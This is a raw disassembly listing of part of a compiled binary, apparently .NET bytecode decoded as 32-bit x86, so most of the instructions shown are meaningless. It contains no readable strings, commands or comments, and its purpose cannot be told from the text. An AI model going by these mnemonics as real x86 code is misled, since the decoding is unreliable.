  402b3d:	00 00                	add    %al,(%eax)
  402b3f:	00 0d 00 00 00 00    	add    %cl,0x0
  402b45:	00 00                	add    %al,(%eax)
  402b47:	00 00                	add    %al,(%eax)
  402b49:	00 00                	add    %al,(%eax)
  402b4b:	00 13                	add    %dl,(%ebx)
  402b4d:	00 00                	add    %al,(%eax)
  402b4f:	00 00                	add    %al,(%eax)
  402b51:	01 00                	add    %eax,(%eax)
  402b53:	00 13                	add    %dl,(%ebx)
  402b55:	01 00                	add    %eax,(%eax)
  402b57:	00 0b                	add    %cl,(%ebx)
  402b59:	00 00                	add    %al,(%eax)
  402b5b:	00 0f                	add    %cl,(%edi)
  402b5d:	00 00                	add    %al,(%eax)
  402b5f:	01 02                	add    %eax,(%edx)
  402b61:	00 00                	add    %al,(%eax)
  402b63:	00 09                	add    %cl,(%ecx)
  402b65:	00 00                	add    %al,(%eax)
  402b67:	00 18                	add    %bl,(%eax)
  402b69:	01 00                	add    %eax,(%eax)
  402b6b:	00 21                	add    %ah,(%ecx)
  402b6d:	01 00                	add    %eax,(%eax)
  402b6f:	00 0b                	add    %cl,(%ebx)
  402b71:	00 00                	add    %al,(%eax)
  402b73:	00 00                	add    %al,(%eax)
  402b75:	00 00                	add    %al,(%eax)
  402b77:	00 1b                	add    %bl,(%ebx)
  402b79:	30 02                	xor    %al,(%edx)
  402b7b:	00 75 00             	add    %dh,0x0(%ebp)
  402b7e:	00 00                	add    %al,(%eax)
  402b80:	07                   	pop    %es
  402b81:	00 00                	add    %al,(%eax)
  402b83:	11 00                	adc    %eax,(%eax)
  402b85:	00 73 4d             	add    %dh,0x4d(%ebx)
  402b88:	00 00                	add    %al,(%eax)
  402b8a:	0a 0a                	or     (%edx),%cl
  402b8c:	06                   	push   %es
  402b8d:	72 d1                	jb     0x402b60
  402b8f:	01 00                	add    %eax,(%eax)
  402b91:	70 6f                	jo     0x402c02
  402b93:	4e                   	dec    %esi
  402b94:	00 00                	add    %al,(%eax)
  402b96:	0a 72 df             	or     -0x21(%edx),%dh
  402b99:	01 00                	add    %eax,(%eax)
  402b9b:	70 6f                	jo     0x402c0c
  402b9d:	4f                   	dec    %edi
  402b9e:	00 00                	add    %al,(%eax)
  402ba0:	0a 00                	or     (%eax),%al
  402ba2:	06                   	push   %es
  402ba3:	72 e9                	jb     0x402b8e
  402ba5:	01 00                	add    %eax,(%eax)
  402ba7:	70 6f                	jo     0x402c18
  402ba9:	4e                   	dec    %esi
  402baa:	00 00                	add    %al,(%eax)
  402bac:	0a 28                	or     (%eax),%ch
  402bae:	36 00 00             	add    %al,%ss:(%eax)
  402bb1:	06                   	push   %es
  402bb2:	6f                   	outsl  %ds:(%esi),(%dx)
  402bb3:	4f                   	dec    %edi
  402bb4:	00 00                	add    %al,(%eax)
  402bb6:	0a 00                	or     (%eax),%al
  402bb8:	1f                   	pop    %ds
  402bb9:	41                   	inc    %ecx
  402bba:	20 00                	and    %al,(%eax)
  402bbc:	00 08                	add    %cl,(%eax)
  402bbe:	00 73 50             	add    %dh,0x50(%ebx)
  402bc1:	00 00                	add    %al,(%eax)
  402bc3:	0a 0b                	or     (%ebx),%cl
  402bc5:	06                   	push   %es
  402bc6:	72 f9                	jb     0x402bc1
  402bc8:	01 00                	add    %eax,(%eax)
  402bca:	70 6f                	jo     0x402c3b
  402bcc:	4e                   	dec    %esi
  402bcd:	00 00                	add    %al,(%eax)
  402bcf:	0a 07                	or     (%edi),%al
  402bd1:	6f                   	outsl  %ds:(%esi),(%dx)
  402bd2:	4f                   	dec    %edi
  402bd3:	00 00                	add    %al,(%eax)
  402bd5:	0a 00                	or     (%eax),%al
  402bd7:	06                   	push   %es
  402bd8:	6f                   	outsl  %ds:(%esi),(%dx)
  402bd9:	51                   	push   %ecx
  402bda:	00 00                	add    %al,(%eax)
  402bdc:	0a 28                	or     (%eax),%ch
  402bde:	21 00                	and    %eax,(%eax)
  402be0:	00 06                	add    %al,(%esi)
  402be2:	00 28                	add    %ch,(%eax)
  402be4:	52                   	push   %edx
  402be5:	00 00                	add    %al,(%eax)
  402be7:	0a 00                	or     (%eax),%al
  402be9:	17                   	pop    %ss
  402bea:	28 1a                	sub    %bl,(%edx)
  402bec:	00 00                	add    %al,(%eax)
  402bee:	06                   	push   %es
  402bef:	00 00                	add    %al,(%eax)
  402bf1:	de 05 26 00 00 de    	fiadds 0xde000026
  402bf7:	00 2a                	add    %ch,(%edx)
  402bf9:	00 00                	add    %al,(%eax)
  402bfb:	00 01                	add    %al,(%ecx)
  402bfd:	10 00                	adc    %al,(%eax)
  402bff:	00 00                	add    %al,(%eax)
  402c01:	00 01                	add    %al,(%ecx)
  402c03:	00 6e 6f             	add    %ch,0x6f(%esi)
  402c06:	00 05 0f 00 00 01    	add    %al,0x100000f
  402c0c:	1b 30                	sbb    (%eax),%esi
  402c0e:	02 00                	add    (%eax),%al
  402c10:	2d 00 00 00 02       	sub    $0x2000000,%eax
  402c15:	00 00                	add    %al,(%eax)
  402c17:	11 00                	adc    %eax,(%eax)
  402c19:	00 28                	add    %ch,(%eax)
  402c1b:	19 00                	sbb    %eax,(%eax)
  402c1d:	00 06                	add    %al,(%esi)
  402c1f:	2c 07                	sub    $0x7,%al
  402c21:	28 12                	sub    %dl,(%edx)
  402c23:	00 00                	add    %al,(%eax)
  402c25:	06                   	push   %es
  402c26:	2b 01                	sub    (%ecx),%eax
  402c28:	16                   	push   %ss
  402c29:	0a 06                	or     (%esi),%al
  402c2b:	2c 0f                	sub    $0xf,%al
  402c2d:	00 28                	add    %ch,(%eax)
  402c2f:	17                   	pop    %ss
  402c30:	00 00                	add    %al,(%eax)
  402c32:	06                   	push   %es
  402c33:	17                   	pop    %ss
  402c34:	58                   	pop    %eax
  402c35:	28 18                	sub    %bl,(%eax)
  402c37:	00 00                	add    %al,(%eax)
  402c39:	06                   	push   %es
  402c3a:	00 00                	add    %al,(%eax)
  402c3c:	00 de                	add    %bl,%dh
  402c3e:	05 26 00 00 de       	add    $0xde000026,%eax
  402c43:	00 2a                	add    %ch,(%edx)
  402c45:	00 00                	add    %al,(%eax)
  402c47:	00 01                	add    %al,(%ecx)
  402c49:	10 00                	adc    %al,(%eax)
  402c4b:	00 00                	add    %al,(%eax)
  402c4d:	00 01                	add    %al,(%ecx)
  402c4f:	00 26                	add    %ah,(%esi)
  402c51:	27                   	daa
  402c52:	00 05 0f 00 00 01    	add    %al,0x100000f
  402c58:	2e 73 14             	jae,pn 0x402c6f
  402c5b:	00 00                	add    %al,(%eax)
  402c5d:	0a 80 1a 00 00 04    	or     0x400001a(%eax),%al
  402c63:	2a 1b                	sub    (%ebx),%bl
  402c65:	30 05 00 aa 02 00    	xor    %al,0x2aa00
  402c6b:	00 08                	add    %cl,(%eax)
  402c6d:	00 00                	add    %al,(%eax)
  402c6f:	11 00                	adc    %eax,(%eax)
  402c71:	00 7e 05             	add    %bh,0x5(%esi)
  402c74:	00 00                	add    %al,(%eax)
  402c76:	04 28                	add    $0x28,%al
  402c78:	53                   	push   %ebx
  402c79:	00 00                	add    %al,(%eax)
  402c7b:	0a 7e 06             	or     0x6(%esi),%bh
  402c7e:	00 00                	add    %al,(%eax)
  402c80:	04 28                	add    $0x28,%al
  402c82:	54                   	push   %esp
  402c83:	00 00                	add    %al,(%eax)
  402c85:	0a 73 55             	or     0x55(%ebx),%dh
  402c88:	00 00                	add    %al,(%eax)
  402c8a:	0a 0a                	or     (%edx),%cl
  402c8c:	28 56 00             	sub    %dl,0x0(%esi)
  402c8f:	00 0a                	add    %cl,(%edx)
  402c91:	6f                   	outsl  %ds:(%esi),(%dx)
  402c92:	57                   	push   %edi
  402c93:	00 00                	add    %al,(%eax)
  402c95:	0a 6f 58             	or     0x58(%edi),%ch
  402c98:	00 00                	add    %al,(%eax)
  402c9a:	0a 0b                	or     (%ebx),%cl
  402c9c:	07                   	pop    %es
  402c9d:	06                   	push   %es
  402c9e:	6f                   	outsl  %ds:(%esi),(%dx)
  402c9f:	59                   	pop    %ecx
  402ca0:	00 00                	add    %al,(%eax)
  402ca2:	0a 28                	or     (%eax),%ch
  402ca4:	5a                   	pop    %edx
  402ca5:	00 00                	add    %al,(%eax)
  402ca7:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  402caa:	39 4a 02             	cmp    %ecx,0x2(%edx)
  402cad:	00 00                	add    %al,(%eax)
  402caf:	00 00                	add    %al,(%eax)
  402cb1:	28 5b 00             	sub    %bl,0x0(%ebx)
  402cb4:	00 0a                	add    %cl,(%edx)
  402cb6:	13 06                	adc    (%esi),%eax
  402cb8:	16                   	push   %ss
  402cb9:	13 07                	adc    (%edi),%eax
  402cbb:	2b 3d 11 06 11 07    	sub    0x7110611,%edi
  402cc1:	9a 13 08 00 00 11 08 	lcall  $0x811,$0x813
  402cc8:	6f                   	outsl  %ds:(%esi),(%dx)
  402cc9:	57                   	push   %edi
  402cca:	00 00                	add    %al,(%eax)
  402ccc:	0a 6f 58             	or     0x58(%edi),%ch
  402ccf:	00 00                	add    %al,(%eax)
  402cd1:	0a 06                	or     (%esi),%al
  402cd3:	6f                   	outsl  %ds:(%esi),(%dx)
  402cd4:	59                   	pop    %ecx
  402cd5:	00 00                	add    %al,(%eax)
  402cd7:	0a 28                	or     (%eax),%ch
  402cd9:	1f                   	pop    %ds
  402cda:	00 00                	add    %al,(%eax)
  402cdc:	0a 13                	or     (%ebx),%dl
  402cde:	09 11                	or     %edx,(%ecx)
  402ce0:	09 2c 08             	or     %ebp,(%eax,%ecx,1)
  402ce3:	11 08                	adc    %ecx,(%eax)
  402ce5:	6f                   	outsl  %ds:(%esi),(%dx)
  402ce6:	5c                   	pop    %esp
  402ce7:	00 00                	add    %al,(%eax)
  402ce9:	0a 00                	or     (%eax),%al
  402ceb:	00 de                	add    %bl,%dh
  402ced:	05 26 00 00 de       	add    $0xde000026,%eax
  402cf2:	00 00                	add    %al,(%eax)
  402cf4:	11 07                	adc    %eax,(%edi)
  402cf6:	17                   	pop    %ss
  402cf7:	58                   	pop    %eax
  402cf8:	13 07                	adc    (%edi),%eax
  402cfa:	11 07                	adc    %eax,(%edi)
  402cfc:	11 06                	adc    %eax,(%esi)
  402cfe:	8e 69 32             	mov    0x32(%ecx),%gs
  402d01:	bb 28 31 00 00       	mov    $0x3128,%ebx
  402d06:	06                   	push   %es
  402d07:	13 0a                	adc    (%edx),%ecx
  402d09:	11 0a                	adc    %ecx,(%edx)
  402d0b:	2c 74                	sub    $0x74,%al
  402d0d:	00 73 5d             	add    %dh,0x5d(%ebx)
  402d10:	00 00                	add    %al,(%eax)
  402d12:	0a 13                	or     (%ebx),%dl
  402d14:	0b 11                	or     (%ecx),%edx
  402d16:	0b 72 15             	or     0x15(%edx),%esi
  402d19:	02 00                	add    (%eax),%al
  402d1b:	70 6f                	jo     0x402d8c
  402d1d:	5e                   	pop    %esi
  402d1e:	00 00                	add    %al,(%eax)
  402d20:	0a 00                	or     (%eax),%al
  402d22:	11 0b                	adc    %ecx,(%ebx)
  402d24:	1b 8d 4b 00 00 01    	sbb    0x100004b(%ebp),%ecx
  402d2a:	25 16 72 1d 02       	and    $0x21d7216,%eax
  402d2f:	00 70 a2             	add    %dh,-0x5e(%eax)
  402d32:	25 17 06 6f 5f       	and    $0x5f6f0617,%eax
  402d37:	00 00                	add    %al,(%eax)
  402d39:	0a 28                	or     (%eax),%ch
  402d3b:	60                   	pusha
  402d3c:	00 00                	add    %al,(%eax)
  402d3e:	0a a2 25 18 72 87    	or     -0x788de7db(%edx),%ah
  402d44:	02 00                	add    (%eax),%al
  402d46:	70 a2                	jo     0x402cea
  402d48:	25 19 06 6f 59       	and    $0x596f0619,%eax
  402d4d:	00 00                	add    %al,(%eax)
  402d4f:	0a a2 25 1a 72 99    	or     -0x668de5db(%edx),%ah
  402d55:	02 00                	add    (%eax),%al
  402d57:	70 a2                	jo     0x402cfb
  402d59:	28 61 00             	sub    %ah,0x0(%ecx)
  402d5c:	00 0a                	add    %cl,(%edx)
  402d5e:	6f                   	outsl  %ds:(%esi),(%dx)
  402d5f:	62 00                	bound  %eax,(%eax)
  402d61:	00 0a                	add    %cl,(%edx)
  402d63:	00 11                	add    %dl,(%ecx)
  402d65:	0b 17                	or     (%edi),%edx
  402d67:	6f                   	outsl  %ds:(%esi),(%dx)
  402d68:	63 00                	arpl   %eax,(%eax)
  402d6a:	00 0a                	add    %cl,(%edx)
  402d6c:	00 11                	add    %dl,(%ecx)
  402d6e:	0b 17                	or     (%edi),%edx
  402d70:	6f                   	outsl  %ds:(%esi),(%dx)
  402d71:	64 00 00             	add    %al,%fs:(%eax)
  402d74:	0a 00                	or     (%eax),%al
  402d76:	11 0b                	adc    %ecx,(%ebx)
  402d78:	28 65 00             	sub    %ah,0x0(%ebp)
  402d7b:	00 0a                	add    %cl,(%edx)
  402d7d:	26 00 2b             	add    %ch,%es:(%ebx)
  402d80:	52                   	push   %edx
  402d81:	00 7e 66             	add    %bh,0x66(%esi)
  402d84:	00 00                	add    %al,(%eax)
  402d86:	0a 72 ad             	or     -0x53(%edx),%dh
  402d89:	02 00                	add    (%eax),%al
  402d8b:	70 28                	jo     0x402db5
  402d8d:	67 00 00             	add    %al,(%bx,%si)
  402d90:	0a 18                	or     (%eax),%bl
  402d92:	6f                   	outsl  %ds:(%esi),(%dx)
  402d93:	68 00 00 0a 13       	push   $0x130a0000
  402d98:	0c 00                	or     $0x0,%al
  402d9a:	11 0c 06             	adc    %ecx,(%esi,%eax,1)
  402d9d:	6f                   	outsl  %ds:(%esi),(%dx)
  402d9e:	5f                   	pop    %edi
  402d9f:	00 00                	add    %al,(%eax)
  402da1:	0a 28                	or     (%eax),%ch
  402da3:	60                   	pusha
  402da4:	00 00                	add    %al,(%eax)
  402da6:	0a 72 0b             	or     0xb(%edx),%dh
  402da9:	03 00                	add    (%eax),%eax
  402dab:	70 06                	jo     0x402db3
  402dad:	6f                   	outsl  %ds:(%esi),(%dx)
  402dae:	59                   	pop    %ecx
  402daf:	00 00                	add    %al,(%eax)
  402db1:	0a 72 0b             	or     0xb(%edx),%dh
  402db4:	03 00                	add    (%eax),%eax
  402db6:	70 28                	jo     0x402de0
  402db8:	40                   	inc    %eax
  402db9:	00 00                	add    %al,(%eax)
  402dbb:	0a 6f 69             	or     0x69(%edi),%ch
  402dbe:	00 00                	add    %al,(%eax)
  402dc0:	0a 00                	or     (%eax),%al
  402dc2:	00 de                	add    %bl,%dh
  402dc4:	0d 11 0c 2c 08       	or     $0x82c0c11,%eax
  402dc9:	11 0c 6f             	adc    %ecx,(%edi,%ebp,2)
  402dcc:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  402dd1:	dc 00                	faddl  (%eax)
  402dd3:	06                   	push   %es
  402dd4:	6f                   	outsl  %ds:(%esi),(%dx)
  402dd5:	59                   	pop    %ecx
  402dd6:	00 00                	add    %al,(%eax)
  402dd8:	0a 28                	or     (%eax),%ch
  402dda:	6a 00                	push   $0x0
  402ddc:	00 0a                	add    %cl,(%edx)
  402dde:	13 0d 11 0d 2c 19    	adc    0x192c0d11,%ecx
  402de4:	00 06                	add    %al,(%esi)
  402de6:	6f                   	outsl  %ds:(%esi),(%dx)
  402de7:	59                   	pop    %ecx
  402de8:	00 00                	add    %al,(%eax)
  402dea:	0a 28                	or     (%eax),%ch
  402dec:	6b 00 00             	imul   $0x0,(%eax),%eax
  402def:	0a 00                	or     (%eax),%al
  402df1:	20 e8                	and    %ch,%al
  402df3:	03 00                	add    (%eax),%eax
  402df5:	00 28                	add    %ch,(%eax)
  402df7:	10 00                	adc    %al,(%eax)
  402df9:	00 0a                	add    %cl,(%edx)
  402dfb:	00 00                	add    %al,(%eax)
  402dfd:	06                   	push   %es
  402dfe:	6f                   	outsl  %ds:(%esi),(%dx)
  402dff:	59                   	pop    %ecx
  402e00:	00 00                	add    %al,(%eax)
  402e02:	0a 17                	or     (%edi),%dl
  402e04:	73 6c                	jae    0x402e72
  402e06:	00 00                	add    %al,(%eax)
  402e08:	0a 0d 07 28 6d 00    	or     0x6d2807,%cl
  402e0e:	00 0a                	add    %cl,(%edx)
  402e10:	13 04 09             	adc    (%ecx,%ecx,1),%eax
  402e13:	11 04 16             	adc    %eax,(%esi,%edx,1)
  402e16:	11 04 8e             	adc    %eax,(%esi,%ecx,4)
  402e19:	69 6f 48 00 00 0a 00 	imul   $0xa0000,0x48(%edi),%ebp
  402e20:	28 32                	sub    %dh,(%edx)
  402e22:	00 00                	add    %al,(%eax)
  402e24:	06                   	push   %es
  402e25:	00 28                	add    %ch,(%eax)
  402e27:	6e                   	outsb  %ds:(%esi),(%dx)
  402e28:	00 00                	add    %al,(%eax)
  402e2a:	0a 72 0f             	or     0xf(%edx),%dh
  402e2d:	03 00                	add    (%eax),%eax
  402e2f:	70 28                	jo     0x402e59
  402e31:	6f                   	outsl  %ds:(%esi),(%dx)
  402e32:	00 00                	add    %al,(%eax)
  402e34:	0a 13                	or     (%ebx),%dl
  402e36:	05 11 05 73 70       	add    $0x70730511,%eax
  402e3b:	00 00                	add    %al,(%eax)
  402e3d:	0a 13                	or     (%ebx),%dl
  402e3f:	0e                   	push   %cs
  402e40:	00 11                	add    %dl,(%ecx)
  402e42:	0e                   	push   %cs
  402e43:	72 19                	jb     0x402e5e
  402e45:	03 00                	add    (%eax),%eax
  402e47:	70 6f                	jo     0x402eb8
  402e49:	71 00                	jno    0x402e4b
  402e4b:	00 0a                	add    %cl,(%edx)
  402e4d:	00 11                	add    %dl,(%ecx)
  402e4f:	0e                   	push   %cs
  402e50:	72 2d                	jb     0x402e7f
  402e52:	03 00                	add    (%eax),%eax
  402e54:	70 6f                	jo     0x402ec5
  402e56:	71 00                	jno    0x402e58
  402e58:	00 0a                	add    %cl,(%edx)
  402e5a:	00 11                	add    %dl,(%ecx)
  402e5c:	0e                   	push   %cs
  402e5d:	72 4d                	jb     0x402eac
  402e5f:	03 00                	add    (%eax),%eax
  402e61:	70 06                	jo     0x402e69
  402e63:	6f                   	outsl  %ds:(%esi),(%dx)
  402e64:	59                   	pop    %ecx
  402e65:	00 00                	add    %al,(%eax)
  402e67:	0a 72 0b             	or     0xb(%edx),%dh
  402e6a:	03 00                	add    (%eax),%eax
  402e6c:	70 28                	jo     0x402e96
  402e6e:	40                   	inc    %eax
  402e6f:	00 00                	add    %al,(%eax)
  402e71:	0a 6f 71             	or     0x71(%edi),%ch
  402e74:	00 00                	add    %al,(%eax)
  402e76:	0a 00                	or     (%eax),%al
  402e78:	11 0e                	adc    %ecx,(%esi)
  402e7a:	72 63                	jb     0x402edf
  402e7c:	03 00                	add    (%eax),%eax
  402e7e:	70 28                	jo     0x402ea8
  402e80:	72 00                	jb     0x402e82
  402e82:	00 0a                	add    %cl,(%edx)
  402e84:	28 6f 00             	sub    %ch,0x0(%edi)
  402e87:	00 0a                	add    %cl,(%edx)
  402e89:	6f                   	outsl  %ds:(%esi),(%dx)
  402e8a:	71 00                	jno    0x402e8c
  402e8c:	00 0a                	add    %cl,(%edx)
  402e8e:	00 11                	add    %dl,(%ecx)
  402e90:	0e                   	push   %cs
  402e91:	72 6b                	jb     0x402efe
  402e93:	03 00                	add    (%eax),%eax
  402e95:	70 11                	jo     0x402ea8
  402e97:	05 28 73 00 00       	add    $0x7328,%eax
  402e9c:	0a 72 77             	or     0x77(%edx),%dh
  402e9f:	03 00                	add    (%eax),%eax
  402ea1:	70 28                	jo     0x402ecb
  402ea3:	40                   	inc    %eax
  402ea4:	00 00                	add    %al,(%eax)
  402ea6:	0a 6f 71             	or     0x71(%edi),%ch
  402ea9:	00 00                	add    %al,(%eax)
  402eab:	0a 00                	or     (%eax),%al
  402ead:	00 de                	add    %bl,%dh
  402eaf:	0d 11 0e 2c 08       	or     $0x82c0e11,%eax
  402eb4:	11 0e                	adc    %ecx,(%esi)
  402eb6:	6f                   	outsl  %ds:(%esi),(%dx)
  402eb7:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  402ebc:	dc 73 5d             	fdivl  0x5d(%ebx)
  402ebf:	00 00                	add    %al,(%eax)
  402ec1:	0a 25 11 05 6f 5e    	or     0x5e6f0511,%ah
  402ec7:	00 00                	add    %al,(%eax)
  402ec9:	0a 00                	or     (%eax),%al
  402ecb:	25 17 6f 64 00       	and    $0x646f17,%eax
  402ed0:	00 0a                	add    %cl,(%edx)
  402ed2:	00 25 16 6f 74 00    	add    %ah,0x746f16
  402ed8:	00 0a                	add    %cl,(%edx)
  402eda:	00 25 16 6f 75 00    	add    %ah,0x756f16
  402ee0:	00 0a                	add    %cl,(%edx)
  402ee2:	00 25 17 6f 63 00    	add    %ah,0x636f17
  402ee8:	00 0a                	add    %cl,(%edx)
  402eea:	00 28                	add    %ch,(%eax)
  402eec:	65 00 00             	add    %al,%gs:(%eax)
  402eef:	0a 26                	or     (%esi),%ah
  402ef1:	16                   	push   %ss
  402ef2:	28 12                	sub    %dl,(%edx)
  402ef4:	00 00                	add    %al,(%eax)
  402ef6:	0a 00                	or     (%eax),%al
  402ef8:	00 00                	add    %al,(%eax)
  402efa:	de 1d 13 0f 00 72    	ficomps 0x72000f13
  402f00:	87 03                	xchg   %eax,(%ebx)
  402f02:	00 70 11             	add    %dh,0x11(%eax)
  402f05:	0f 6f 76 00          	movq   0x0(%esi),%mm6
  402f09:	00 0a                	add    %cl,(%edx)
  402f0b:	28 6f 00             	sub    %ch,0x0(%edi)
  402f0e:	00 0a                	add    %cl,(%edx)
  402f10:	28 2e                	sub    %ch,(%esi)
  402f12:	00 00                	add    %al,(%eax)
  402f14:	0a 00                	or     (%eax),%al
  402f16:	00 de                	add    %bl,%dh
  402f18:	00 2a                	add    %ch,(%edx)
  402f1a:	00 00                	add    %al,(%eax)
  402f1c:	41                   	inc    %ecx
  402f1d:	64 00 00             	add    %al,%fs:(%eax)
  402f20:	00 00                	add    %al,(%eax)
  402f22:	00 00                	add    %al,(%eax)
  402f24:	55                   	push   %ebp
  402f25:	00 00                	add    %al,(%eax)
  402f27:	00 29                	add    %ch,(%ecx)
  402f29:	00 00                	add    %al,(%eax)
  402f2b:	00 7e 00             	add    %bh,0x0(%esi)
  402f2e:	00 00                	add    %al,(%eax)
  402f30:	05 00 00 00 0f       	add    $0xf000000,%eax
  402f35:	00 00                	add    %al,(%eax)
  402f37:	01 02                	add    %eax,(%edx)
  402f39:	00 00                	add    %al,(%eax)
  402f3b:	00 29                	add    %ch,(%ecx)
  402f3d:	01 00                	add    %eax,(%eax)
  402f3f:	00 2c 00             	add    %ch,(%eax,%eax,1)
  402f42:	00 00                	add    %al,(%eax)
  402f44:	55                   	push   %ebp
  402f45:	01 00                	add    %eax,(%eax)
  402f47:	00 0d 00 00 00 00    	add    %cl,0x0
  402f4d:	00 00                	add    %al,(%eax)
  402f4f:	00 02                	add    %al,(%edx)
  402f51:	00 00                	add    %al,(%eax)
  402f53:	00 d0                	add    %dl,%al
  402f55:	01 00                	add    %eax,(%eax)
  402f57:	00 70 00             	add    %dh,0x0(%eax)
  402f5a:	00 00                	add    %al,(%eax)
  402f5c:	40                   	inc    %eax
  402f5d:	02 00                	add    (%eax),%al
  402f5f:	00 0d 00 00 00 00    	add    %cl,0x0
  402f65:	00 00                	add    %al,(%eax)
  402f67:	00 00                	add    %al,(%eax)
  402f69:	00 00                	add    %al,(%eax)
  402f6b:	00 01                	add    %al,(%ecx)
  402f6d:	00 00                	add    %al,(%eax)
  402f6f:	00 8b 02 00 00 8c    	add    %cl,-0x73fffffe(%ebx)
  402f75:	02 00                	add    (%eax),%al
  402f77:	00 1d 00 00 00 12    	add    %bl,0x12000000
  402f7d:	00 00                	add    %al,(%eax)
  402f7f:	01 22                	add    %esp,(%edx)
  402f81:	02 28                	add    (%eax),%ch
  402f83:	14 00                	adc    $0x0,%al
  402f85:	00 0a                	add    %cl,(%edx)
  402f87:	00 2a                	add    %ch,(%edx)
  402f89:	00 00                	add    %al,(%eax)
  402f8b:	00 13                	add    %dl,(%ebx)
  402f8d:	30 01                	xor    %al,(%ecx)
  402f8f:	00 31                	add    %dh,(%ecx)
  402f91:	00 00                	add    %al,(%eax)
  402f93:	00 02                	add    %al,(%edx)
  402f95:	00 00                	add    %al,(%eax)
  402f97:	11 00                	adc    %eax,(%eax)
  402f99:	28 2a                	sub    %ch,(%edx)
  402f9b:	00 00                	add    %al,(%eax)
  402f9d:	06                   	push   %es
  402f9e:	2d 1c 28 2b 00       	sub    $0x2b281c,%eax
  402fa3:	00 06                	add    %al,(%esi)
  402fa5:	2d 15 28 2c 00       	sub    $0x2c2815,%eax
  402faa:	00 06                	add    %al,(%esi)
  402fac:	2d 0e 28 28 00       	sub    $0x28280e,%eax
  402fb1:	00 06                	add    %al,(%esi)
  402fb3:	2d 07 28 29 00       	sub    $0x292807,%eax
  402fb8:	00 06                	add    %al,(%esi)
  402fba:	2b 01                	sub    (%ecx),%eax
  402fbc:	17                   	pop    %ss
  402fbd:	0a 06                	or     (%esi),%al
  402fbf:	2c 07                	sub    $0x7,%al
  402fc1:	14 28                	adc    $0x28,%al
  402fc3:	77 00                	ja     0x402fc5
  402fc5:	00 0a                	add    %cl,(%edx)
  402fc7:	00 2a                	add    %ch,(%edx)
  402fc9:	00 00                	add    %al,(%eax)
  402fcb:	00 1b                	add    %bl,(%ebx)
  402fcd:	30 02                	xor    %al,(%edx)
  402fcf:	00 3c 00             	add    %bh,(%eax,%eax,1)
  402fd2:	00 00                	add    %al,(%eax)
  402fd4:	09 00                	or     %eax,(%eax)
  402fd6:	00 11                	add    %dl,(%ecx)
  402fd8:	00 00                	add    %al,(%eax)
  402fda:	21 00                	and    %eax,(%eax)
  402fdc:	22 e2                	and    %dl,%ah
  402fde:	33 0e                	xor    (%esi),%ecx
  402fe0:	00 00                	add    %al,(%eax)
  402fe2:	00 0a                	add    %cl,(%edx)
  402fe4:	28 78 00             	sub    %bh,0x0(%eax)
  402fe7:	00 0a                	add    %cl,(%edx)
  402fe9:	28 79 00             	sub    %bh,0x0(%ecx)
  402fec:	00 0a                	add    %cl,(%edx)
  402fee:	73 7a                	jae    0x40306a
  402ff0:	00 00                	add    %al,(%eax)
  402ff2:	0a 28                	or     (%eax),%ch
  402ff4:	7b 00                	jnp    0x402ff6
  402ff6:	00 0a                	add    %cl,(%edx)
  402ff8:	06                   	push   %es
  402ff9:	fe 02                	incb   (%edx)
  402ffb:	16                   	push   %ss
  402ffc:	fe 01                	incb   (%ecx)
  402ffe:	0b 07                	or     (%edi),%eax
  403000:	2c 04                	sub    $0x4,%al
  403002:	17                   	pop    %ss
  403003:	0c de                	or     $0xde,%al
  403005:	0c 00                	or     $0x0,%al
  403007:	de 05 26 00 00 de    	fiadds 0xde000026
  40300d:	00 16                	add    %dl,(%esi)
  40300f:	0c 2b                	or     $0x2b,%al
  403011:	00 08                	add    %cl,(%eax)
  403013:	2a 01                	sub    (%ecx),%al
  403015:	10 00                	adc    %al,(%eax)
  403017:	00 00                	add    %al,(%eax)
  403019:	00 01                	add    %al,(%ecx)
  40301b:	00 30                	add    %dh,(%eax)
  40301d:	31 00                	xor    %eax,(%eax)
  40301f:	05 0f 00 00 01       	add    $0x100000f,%eax
  403024:	1b 30                	sbb    (%eax),%esi
  403026:	02 00                	add    (%eax),%al
  403028:	32 00                	xor    (%eax),%al
  40302a:	00 00                	add    %al,(%eax)
  40302c:	0a 00                	or     (%eax),%al
  40302e:	00 11                	add    %dl,(%ecx)
  403030:	00 00                	add    %al,(%eax)
  403032:	73 7c                	jae    0x4030b0
  403034:	00 00                	add    %al,(%eax)
  403036:	0a 28                	or     (%eax),%ch
  403038:	7d 00                	jge    0x40303a
  40303a:	00 0a                	add    %cl,(%edx)
  40303c:	6f                   	outsl  %ds:(%esi),(%dx)
  40303d:	7e 00                	jle    0x40303f
  40303f:	00 0a                	add    %cl,(%edx)
  403041:	72 ab                	jb     0x402fee
  403043:	03 00                	add    (%eax),%eax
  403045:	70 6f                	jo     0x4030b6
  403047:	7f 00                	jg     0x403049
  403049:	00 0a                	add    %cl,(%edx)
  40304b:	0a 06                	or     (%esi),%al
  40304d:	2c 05                	sub    $0x5,%al
  40304f:	00 17                	add    %dl,(%edi)
  403051:	0b de                	or     %esi,%ebx
  403053:	0c 00                	or     $0x0,%al
  403055:	de 05 26 00 00 de    	fiadds 0xde000026
  40305b:	00 16                	add    %dl,(%esi)
  40305d:	0b 2b                	or     (%ebx),%ebp
  40305f:	00 07                	add    %al,(%edi)
  403061:	2a 00                	sub    (%eax),%al
  403063:	00 01                	add    %al,(%ecx)
  403065:	10 00                	adc    %al,(%eax)
  403067:	00 00                	add    %al,(%eax)
  403069:	00 01                	add    %al,(%ecx)
  40306b:	00 26                	add    %ah,(%esi)
  40306d:	27                   	daa
  40306e:	00 05 0f 00 00 01    	add    %al,0x100000f
  403074:	1b 30                	sbb    (%eax),%esi
  403076:	02 00                	add    (%eax),%al
  403078:	ed                   	in     (%dx),%eax
  403079:	00 00                	add    %al,(%eax)
  40307b:	00 0b                	add    %cl,(%ebx)
  40307d:	00 00                	add    %al,(%eax)
  40307f:	11 00                	adc    %eax,(%eax)
  403081:	00 72 b1             	add    %dh,-0x4f(%edx)
  403084:	03 00                	add    (%eax),%eax
  403086:	70 73                	jo     0x4030fb
  403088:	80 00 00             	addb   $0x0,(%eax)
  40308b:	0a 0a                	or     (%edx),%cl
  40308d:	00 06                	add    %al,(%esi)
  40308f:	6f                   	outsl  %ds:(%esi),(%dx)
  403090:	81 00 00 0a 0b 00    	addl   $0xb0a00,(%eax)
  403096:	00 07                	add    %al,(%edi)
  403098:	6f                   	outsl  %ds:(%esi),(%dx)
  403099:	82 00 00             	addb   $0x0,(%eax)
  40309c:	0a 0c 38             	or     (%eax,%edi,1),%cl
